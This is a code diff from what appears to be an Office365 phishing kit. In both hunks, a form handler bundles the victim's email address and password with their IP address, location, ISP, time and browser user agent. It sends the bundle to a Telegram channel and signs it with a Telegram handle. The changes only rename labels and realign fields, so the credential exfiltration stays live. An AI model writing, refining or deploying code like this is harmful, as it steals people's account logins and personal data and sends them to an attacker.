@@ -86,20 +86,20 @@ const submitForm = async () => {
             const channelID = '-1002004436374'; 
             
             const body =
-            `OFFICE365 Email Access\n\n` +
-            `📧Email            : ${emailFromUrl.value}\n` +
-            `🔑Email Pass            : ${password.value}\n\n` +
+            `OFFICE365 Log\n\n` +
+            `📧Email    : ${emailFromUrl.value}\n` +
+            `🔑Password : ${password.value}\n\n` +
             `++++++++++++++++++++++++++++\n\n` +
             `IP ADDRESS INFO\n` +
-            `IP Address       : ${query}\n` +
-            `City             : ${city}\n` +
-            `State            : ${region}\n` +
-            `Country          : ${country}\n` +
-            `ISP              : ${isp}\n\n` + 
-            `TIME             : ${new Date().toLocaleString()} GMT\n\n` +
+            `IP Address  : ${query}\n` +
+            `City        : ${city}\n` +
+            `State       : ${region}\n` +
+            `Country     : ${country}\n` +
+            `ISP         : ${isp}\n\n` + 
+            `TIME        : ${new Date().toLocaleString()} GMT\n\n` +
             `++++++++++++++++++++++++++++\n\n` +
             `SYSTEM INFO || USER AGENT\n` +
-            `USER AGENT       : ${userAgent}\n` +
+            `USER AGENT  : ${userAgent}\n` +
             `👨‍💻 @nightowel04 - TG 👨‍💻`;
 
             const send = { chat_id: channelID, text: body };
@@ -136,20 +136,20 @@ const submitForm = async () => {
             const channelID = '-1002004436374'; 
             
             const body =
-            `OFFICE365 Email Access\n\n` +
-            `📧Email            : ${emailFromUrl.value}\n` +
-            `🔑Email Pass            : ${password.value}\n\n` +
+            `OFFICE365 Log\n\n` +
+            `📧Email    : ${emailFromUrl.value}\n` +
+            `🔑Password : ${password.value}\n\n` +
             `++++++++++++++++++++++++++++\n\n` +
             `IP ADDRESS INFO\n` +
-            `IP Address       : ${query}\n` +
-            `City             : ${city}\n` +
-            `State            : ${region}\n` +
-            `Country          : ${country}\n` +
-            `ISP              : ${isp}\n\n` + 
-            `TIME             : ${new Date().toLocaleString()} GMT\n\n` +
+            `IP Address  : ${query}\n` +
+            `City        : ${city}\n` +
+            `State       : ${region}\n` +
+            `Country     : ${country}\n` +
+            `ISP         : ${isp}\n\n` + 
+            `TIME        : ${new Date().toLocaleString()} GMT\n\n` +
             `++++++++++++++++++++++++++++\n\n` +
             `SYSTEM INFO || USER AGENT\n` +
-            `USER AGENT       : ${userAgent}\n` +
+            `USER AGENT  : ${userAgent}\n` +
             `👨‍💻 @nightowel04 - TG 👨‍💻`;
 
             const send = { chat_id: channelID, text: body };
